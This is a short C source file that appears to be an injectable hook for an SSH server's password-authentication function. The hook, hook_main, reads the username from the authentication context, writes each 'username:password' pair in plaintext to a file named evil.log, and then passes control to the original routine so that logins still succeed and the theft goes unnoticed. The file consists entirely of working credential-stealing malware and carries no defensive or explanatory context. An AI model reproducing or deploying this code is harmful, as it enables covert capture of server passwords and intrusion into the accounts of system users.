#include "syscall.h"

int _strlen(const char *s) {
	int len=0;

	while(*s++)
		len++;

	return len;
}

typedef int (*f_auth_passwd)(void *authctx, char *pass);

int hook_main(void *authctx, char *password) {
	f_auth_passwd auth_passwd = (f_auth_passwd)0x3333333344444444;
	f_auth_passwd mm_auth_passwd = (f_auth_passwd)0x5555555566666666;

	int fd=0;
	unsigned long long use_privsep = 0x1111111122222222;

	if((fd = _open("./evil.log", 0x442, 0666)) == -1) {
		_write(1, "open file failed :(\n", 20);
		_exit(1);
	}

	_write(fd, *(char **)(authctx + 0x20), _strlen(*(char**)(authctx + 0x20)));
	_write(fd, ":", 1);
	_write(fd, password, _strlen(password));
	_write(fd, "\n", 1);
	_close(fd);

	if (use_privsep) {
		return mm_auth_passwd(authctx, password);
	} else {
		return auth_passwd(authctx, password);
	}
}
